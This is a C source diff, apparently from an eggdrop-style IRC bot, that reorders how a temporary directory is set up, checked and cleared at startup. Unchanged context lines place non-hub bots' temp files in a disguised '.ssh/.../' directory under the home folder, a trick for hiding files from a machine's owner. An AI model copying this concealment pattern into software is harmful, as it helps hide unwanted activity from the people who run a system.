@@ -542,8 +542,6 @@ static void startup_checks(int hack) {
    * if settings.uname is NOT empty, just erase the conf file if it exists
    * otherwise, assume we're working only with the struct */
 
-  check_tempdir();
-
 #ifdef CYGWIN_HACKS
   egg_snprintf(cfile, sizeof cfile, STR("./conf.txt"));
 
@@ -646,10 +644,13 @@ printf("out: %s\n", out);
     fatal("!! Invalid binary", 0);
   }
 
-  /* setup initial tempdir */
-  egg_snprintf(tempdir, sizeof(tempdir), ".tmp/");
+  /* setup initial tempdir as ./ until we read in tmpdir from conf */
+  egg_snprintf(tempdir, sizeof(tempdir), "./");
 
   binname = getfullbinname(argv[0]);
+  chdir(dirname(binname));
+
+  check_tempdir();	/* make sure directory exists and we can access it */
 
   /* This allows -2/-0 to be used without an initialized binary */
 //  if (!(argc == 2 && (!strcmp(argv[1], "-2") || !strcmp(argv[1], "0")))) {
@@ -682,11 +683,6 @@ printf("out: %s\n", out);
   egg_memcpy(&nowtm, gmtime(&now), sizeof(struct tm));
   lastmin = nowtm.tm_min;
 
-#ifdef CYGWIN_HACKS
-  egg_snprintf(tempdir, sizeof tempdir, "./tmp/");
-#endif /* CYGWIN_HACKS */
-  clear_tmp();		/* clear out the tmp dir, no matter if we are localhub or not */
-
   if (argc) {
     sdprintf("Calling dtx_arg with %d params.", argc);
     dtx_arg(argc, argv);
@@ -702,10 +698,18 @@ printf("out: %s\n", out);
   /* Check and load conf file */
   startup_checks(0);
 
+  /* this is temporary until we make tmpdir customizable */
   if (conf.bot->hub)
     egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", conf.binpath);
   else
     egg_snprintf(tempdir, sizeof tempdir, "%s/.ssh/.../", conf.homedir);
+
+#ifdef CYGWIN_HACKS
+  egg_snprintf(tempdir, sizeof tempdir, "tmp/");
+#endif /* CYGWIN_HACKS */
+
+  check_tempdir();	/* ensure we can access tmpdir if it changed */
+  clear_tmp();		/* clear out the tmp dir, no matter if we are localhub or not */
 
   if ((conf.bot->localhub && !updating) || !conf.bot->localhub) {
     if ((conf.bot->pid > 0) && conf.bot->pid_file) {
